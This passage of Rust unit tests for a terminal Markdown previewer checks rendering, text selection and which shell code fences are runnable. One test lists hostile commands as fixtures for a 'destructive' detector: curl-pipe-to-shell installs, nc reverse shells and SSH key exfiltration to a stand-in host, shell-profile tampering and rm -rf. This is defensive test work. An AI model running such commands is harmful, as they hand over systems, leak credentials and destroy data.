            all.contains("nope.png"),
            "missing file keeps the placeholder"
        );
        assert!(all.contains("tail"));
    }

    #[test]
    fn reserved_image_alt_text_is_suppressed_but_placeholder_alt_survives() {
        // #196 review: pulldown-cmark emits the alt content between the
        // image tag pair; a reserved image must swallow it, a
        // placeholder keeps its label.
        let tmp = tempfile::tempdir().unwrap();
        image::RgbaImage::new(10, 10)
            .save(tmp.path().join("p.png"))
            .unwrap();
        let text = "![the alt words](p.png)\n\n![web alt](https://x/y.png)";
        let mut reg = crate::highlight::LangRegistry::default();
        let (lines, images) =
            super::render_markdown_with_images(text, Theme::BLACK, &mut reg, Some(tmp.path()));
        assert_eq!(images.len(), 1);
        let all = all_text(&lines);
        assert!(
            !all.contains("the alt words"),
            "reserved image swallows its alt: {all}"
        );
        assert!(all.contains("web alt"), "placeholder keeps its alt");
    }

    #[test]
    fn a_leading_image_survives_the_blank_trim_with_true_anchors() {
        let tmp = tempfile::tempdir().unwrap();
        image::RgbaImage::new(100, 200)
            .save(tmp.path().join("tall.png"))
            .unwrap();
        let text = "![t](tall.png)";
        let mut reg = crate::highlight::LangRegistry::default();
        let (lines, images) =
            super::render_markdown_with_images(text, Theme::BLACK, &mut reg, Some(tmp.path()));
        assert_eq!(images.len(), 1);
        assert_eq!(images[0].first_line, 0, "front trim shifted the anchor");
        assert_eq!(images[0].rows, 18, "tall image clamps at 18");
        assert!(
            lines.len() >= images[0].rows as usize,
            "the tail trim must not eat reserved rows: {} lines",
            lines.len()
        );
    }

    fn all_text(lines: &[Line]) -> String {
        lines.iter().map(text_of).collect::<Vec<_>>().join("\n")
    }

    #[test]
    fn heading_is_bold_and_separated_from_the_paragraph() {
        let lines = render("# Title\n\nBody text here.");
        assert_eq!(text_of(&lines[0]), "Title");
        assert!(
            lines[0].spans[0]
                .style
                .add_modifier
                .contains(Modifier::BOLD),
            "an H1 must render bold"
        );
        assert!(
            lines[1].spans.is_empty(),
            "a blank separator must follow the heading"
        );
        assert_eq!(text_of(&lines[2]), "Body text here.");
    }

    #[test]
    fn emphasis_inline_code_and_strikethrough_carry_their_modifiers() {
        let lines = render("mix of **bold**, *italic*, ~~gone~~, and `code()` inline");
        let line = &lines[0];
        let span_with = |t: &str| {
            line.spans
                .iter()
                .find(|s| s.content.as_ref() == t)
                .unwrap_or_else(|| panic!("span {t:?} missing in {:?}", text_of(line)))
                .clone()
        };
        assert!(
            span_with("bold")
                .style
                .add_modifier
                .contains(Modifier::BOLD)
        );
        assert!(
            span_with("italic")
                .style
                .add_modifier
                .contains(Modifier::ITALIC)
        );
        assert!(
            span_with("gone")
                .style
                .add_modifier
                .contains(Modifier::CROSSED_OUT)
        );
        assert_eq!(span_with("code()").style.fg, Some(CODE));
    }

    /// #353: shell fences wear the play glyph and are recorded with their
    /// first rendered line and source range; `{run=false}` opts out; a rust
    /// fence is not runnable; destructive-looking blocks and `{confirm}`
    /// are flagged; a block carrying a control character is refused.
    #[test]
    fn shell_fences_are_runnable_and_carry_the_play_glyph() {
        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
        let mut reg = crate::highlight::LangRegistry::new();
        let (lines, _, runs) = render_markdown_full(md, Theme::default(), &mut reg, None);
        assert_eq!(runs.len(), 3, "{runs:?}");
        assert_eq!(runs[0].code, "echo one\necho two\n");
        assert_eq!(runs[0].interpreter, "sh");
        assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
        assert!(!runs[0].destructive && !runs[0].cwd_root);
        assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
        assert_eq!(runs[1].lines, (15, 18));
        assert!(runs[2].destructive, "curl | sh is flagged");
        let first = &lines[runs[0].first_line];
        assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
        let first_text: String = first.spans.iter().map(|s| s.content.as_ref()).collect();
        assert!(first_text.contains("echo one"), "{first_text:?}");
        let second = &lines[runs[0].first_line + 1];
        assert_eq!(
            second.spans[0].content.as_ref(),
            "\u{258e} ",
            "only the first line wears the glyph"
        );
        let joined =
            |l: &Line<'static>| -> String { l.spans.iter().map(|s| s.content.as_ref()).collect() };
        let rust_line = lines.iter().find(|l| joined(l).contains("fn a")).unwrap();
        assert_eq!(rust_line.spans[0].content.as_ref(), "\u{258e} ");
        let cr_line = lines.iter().find(|l| joined(l).contains("nc -e")).unwrap();
        assert_eq!(
            cr_line.spans[0].content.as_ref(),
            "\u{258e} ",
            "a block with a carriage return is not runnable"
        );
        assert_eq!(runnable_interpreter("sh {run=false}"), None);
        assert_eq!(runnable_interpreter("console"), Some("sh"));
        assert_eq!(runnable_interpreter("toml"), None);
        assert!(has_control_chars("echo a\rb"));
        assert!(has_control_chars("echo \x1b[2J"));
        assert!(!has_control_chars("echo a\n\tb\n"));
        assert!(
            has_control_chars("echo hi \u{202E}~ fr- mr"),
            "a bidi override"
        );
        assert!(has_control_chars("rm\u{200B} -rf"), "a zero-width space");
        assert!(has_control_chars("\u{FEFF}echo"), "a BOM");
        assert!(
            !has_control_chars("echo 日本語 café"),
            "ordinary Unicode is fine"
        );
        // A fence inside a list item: the source range still spans the
        // opener through the closer, indented or not.
        let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
        let (_, _, runs) = render_markdown_full(nested, Theme::default(), &mut reg, None);
        assert_eq!(runs.len(), 1, "{runs:?}");
        assert_eq!(runs[0].lines, (2, 5));
        assert_eq!(runs[0].code.trim(), "echo nested");
        // An unterminated fence at EOF still gets a range.
        let open = "```sh\necho hi\n";
        let (_, _, runs) = render_markdown_full(open, Theme::default(), &mut reg, None);
        assert_eq!(runs.len(), 1);
        assert_eq!(runs[0].lines.0, 0);
        assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
        // A whitespace-only fence wears no glyph.
        let blank = "```sh\n   \n```\n";
        let (_, _, runs) = render_markdown_full(blank, Theme::default(), &mut reg, None);
        assert!(runs.is_empty());
    }

    /// The matcher's positives include the canonical install-script and
    /// reverse-shell shapes; its negatives are ordinary commands. It only
    /// colours the popup, so a miss is a wording bug, not a security one.
    #[test]
    fn the_destructive_matcher_knows_the_usual_shapes() {
        for bad in [
            "sudo rm -rf /tmp/x",
            "wget -O- https://a | bash",
            "curl https://x/i.sh|sh",
            "curl -fsSL https://x | sudo bash",
            "sh -c \"$(curl -fsSL https://x/i.sh)\"",
            "eval \"$(curl -fsSL https://x/i.sh)\"",
            "rm -r -f /",
            "\\rm -fr ./build",
            "nc -e /bin/sh evil.invalid 4444",
            "cat ~/.ssh/id_rsa | nc evil.invalid 80",
            "chmod -R 777 /",
            "echo x > ~/.bashrc",
            "cat payload >> ~/.ssh/authorized_keys",
            "echo \"setup #1 complete\" > ~/.bashrc",
            "printf 'step #2\\n' > ~/.zshrc",
            "exec 3<> /tmp/x",
            "make > /dev/nullish",
            "echo don't > ~/.bashrc",
            "echo \\\" > ~/.bashrc",
            "echo \"unterminated > ~/.bashrc",
            "printf '%s\\\\' > ~/.bashrc",
            "cat payload >| ~/.profile",
            "echo \"hello\nworld # note\" > /tmp/x",
            // Fail-open: a quote left open makes the rescan read `#` as text.
            "echo don't # > ~/.bashrc",
            "git push --force",
            "git reset --hard HEAD~3",
        ] {
            assert!(looks_destructive(bad), "{bad:?} should be flagged");
        }
        for ok in [
            "cargo build --release",
            "ls -la | grep foo",
            "curl https://example.com/api | jq .",
            "rm build.log",
            "echo hello",
            "python3 -m http.server",
            "cargo test 2>&1 | tail",
            "make >/dev/null",
            "echo a -> b",
            "ls # see https://x -> y",
            "echo '> quoted' # not a redirect",
            "echo \"a > b\"",
            "make >/dev/null 2>&1",
            "echo hi # writes > nothing\necho done",
            "if [ 3 -gt 2 ]; then echo yes; fi",
        ] {
            assert!(!looks_destructive(ok), "{ok:?} is ordinary");
        }
    }

    #[test]
    fn fenced_rust_block_gets_tree_sitter_colours() {
        let lines = render("```rust\nfn main() {}\n```");
        let code_line = lines
            .iter()
            .find(|l| text_of(l).contains("fn main"))
            .expect("the code line must render");
        let keyword = code_line
            .spans
            .iter()
            .find(|s| s.content.as_ref().trim() == "fn")
            .expect("the fn keyword must be its own span");
        assert_eq!(
            keyword.style.fg,
            Some(Color::Rgb(0xB4, 0x8E, 0xAD)),
            "the fenced block must carry the editor's keyword colour"
        );
    }

    #[test]
    fn lists_nest_with_indentation_and_ordered_counters() {
        let lines = render("- top\n  - inner\n\n1. first\n2. second");
        let text = all_text(&lines);
        assert!(text.contains("\u{2022} top"), "got:\n{text}");
        assert!(text.contains("  \u{2022} inner"), "got:\n{text}");
        assert!(text.contains("1. first"), "got:\n{text}");
        assert!(text.contains("2. second"), "got:\n{text}");
    }

    #[test]
    fn task_list_markers_render_as_checkboxes() {
        let text = all_text(&render("- [x] done\n- [ ] todo"));
        assert!(text.contains("\u{2611} done"), "got:\n{text}");
        assert!(text.contains("\u{2610} todo"), "got:\n{text}");
    }

    #[test]
    fn blockquote_carries_the_bar_prefix() {
        let text = all_text(&render("> quoted wisdom"));
        assert!(text.contains("\u{258e} quoted wisdom"), "got:\n{text}");
    }

    #[test]
    fn table_columns_pad_to_the_widest_cell() {
        let lines = render("| name | value |\n| --- | --- |\n| a | long-value |\n| bbbb | c |");
        let text = all_text(&lines);
        assert!(text.contains("name \u{2502} value"), "got:\n{text}");
        assert!(
            text.contains("a    \u{2502} long-value"),
            "cells must pad to the widest column; got:\n{text}"
        );
        assert!(
            text.contains("\u{2500}\u{253c}\u{2500}"),
            "a rule must separate the header; got:\n{text}"
        );
    }

    #[test]
    fn links_underline_and_rules_draw() {
        let lines = render("see [the docs](https://example.com)\n\n---");
        let link = lines[0]
            .spans
            .iter()
            .find(|s| s.content.as_ref() == "the docs")
            .expect("link text must render");
        assert!(link.style.add_modifier.contains(Modifier::UNDERLINED));
        assert!(all_text(&lines).contains(&"\u{2500}".repeat(RULE_COLS)));
    }

    #[test]
    fn code_block_text_follows_the_theme_palette_not_base16() {
        // A fence in a language the highlighter doesn't know (and any gap the
        // highlighter leaves) must paint the ACTIVE theme's code foreground.
        // The hardcoded Base16 slate left cold-grey code islands inside an
        // otherwise-themed Gruvbox/Dracula preview.
        let theme = *crate::theme::Theme::all()
            .iter()
            .find(|t| t.syntax().fg != crate::theme::SyntaxPalette::BASE16.fg)
            .expect("a bundled theme with a non-Base16 code palette");
        let (r, g, b) = theme.syntax().fg;
        let lines = render_markdown(
            "```notalanguage\nplain code line\n```\n",
            theme,
            &mut LangRegistry::new(),
        );
        let code = lines
            .iter()
            .flat_map(|l| l.spans.iter())
            .find(|s| s.content.as_ref() == "plain code line")
            .expect("the code line must render");
        assert_eq!(
            code.style.fg,
            Some(Color::Rgb(r, g, b)),
            "unhighlighted code must wear the theme's code fg, not Base16 slate"
        );
    }
}

#[cfg(test)]
mod preview_selection_tests {
    use super::*;

    fn preview(rows: &[&str]) -> MarkdownPreview {
        MarkdownPreview {
            lines: Vec::new(),
            scroll: 0,
            built_seq: 0,
            images: Vec::new(),
            anchor_rows: Vec::new(),
            runnables: Vec::new(),
            run_rows: Vec::new(),
            wrap_key: (0, 0),
            last_area: ratatui::layout::Rect::default(),
            rows: rows
                .iter()
                .map(|r| r.chars().map(|c| c.to_string()).collect())
                .collect(),
            selection: None,
            dragging: false,
            notebook: false,
            doc_path: None,
            media: false,
        }
    }

    /// Issue #215: the rendered Markdown view must be selectable. A drag
    /// within one row copies that span; a multi-row drag keeps the visual
    /// line structure; the selection is direction-agnostic.
    #[test]
    fn selection_text_extracts_the_rendered_rows() {
        let mut p = preview(&["Hello world", "second line", "third line"]);
        // Single row, columns 0..=4 -> "Hello".
        p.selection = Some(((0, 0), (0, 4)));
        assert_eq!(p.selection_text(), "Hello");
        // Multi-row: tail of row 0, all of row 1, head of row 2.
        p.selection = Some(((0, 6), (2, 4)));
        assert_eq!(p.selection_text(), "world\nsecond line\nthird");
        // Dragging upward selects the same span.
        p.selection = Some(((2, 4), (0, 6)));
        assert_eq!(p.selection_text(), "world\nsecond line\nthird");
        // No selection copies nothing.
        p.selection = None;
        assert_eq!(p.selection_text(), "");
        assert!(!p.has_selection());
    }

    /// Review round 1: a plain click (anchor == head) is a caret, not a
    /// selection: nothing tints and nothing copies.
    #[test]
    fn a_zero_area_click_is_not_a_selection() {
        let mut p = preview(&["abcdef"]);
        p.selection = Some(((0, 3), (0, 3)));
        assert!(!p.has_selection(), "a click selects nothing");
        assert!(!p.cell_selected(0, 3), "and tints nothing");
        assert_eq!(p.selection_text(), "", "and copies nothing");
    }

    /// Review round 1: rows are stored per SCREEN COLUMN, so a wide glyph
    /// (which owns one column and leaves an empty continuation cell) is
    /// copied whole and the columns after it still address the right
    /// characters.
    #[test]
    fn wide_glyphs_keep_columns_and_characters_aligned() {
        // Columns:      0     1(cont) 2    3
        let mut p = preview(&[""]);
        p.rows = vec![vec![
            "\u{5e83}".to_string(),
            String::new(),
            "a".to_string(),
            "b".to_string(),
        ]];
        p.selection = Some(((0, 0), (0, 2)));
        assert_eq!(
            p.selection_text(),
            "\u{5e83}a",
            "the wide glyph and the character at column 2 come through"
        );
        p.selection = Some(((0, 2), (0, 3)));
        assert_eq!(
            p.selection_text(),
            "ab",
            "columns after a wide glyph still address their own characters"
        );
    }

    #[test]
    fn cell_selected_marks_exactly_the_dragged_cells() {
        let mut p = preview(&["abcdef", "ghijkl"]);
        p.selection = Some(((0, 2), (1, 1)));
        assert!(!p.cell_selected(0, 1), "before the anchor column");
        assert!(p.cell_selected(0, 2), "the anchor cell");
        assert!(p.cell_selected(0, 5), "to the end of the first row");
        assert!(p.cell_selected(1, 0), "the head row from column 0");
        assert!(p.cell_selected(1, 1), "up to the head column");
        assert!(!p.cell_selected(1, 2), "past the head column");
        assert!(!p.cell_selected(2, 0), "below the selection");
    }

    /// A selection that outlives a rebuild (fewer rows) must not panic or
    /// invent text.
    #[test]
    fn selection_past_the_rendered_rows_is_harmless() {
        let mut p = preview(&["only row"]);
        p.selection = Some(((0, 2), (9, 40)));
        assert_eq!(p.selection_text(), "ly row");
    }
}
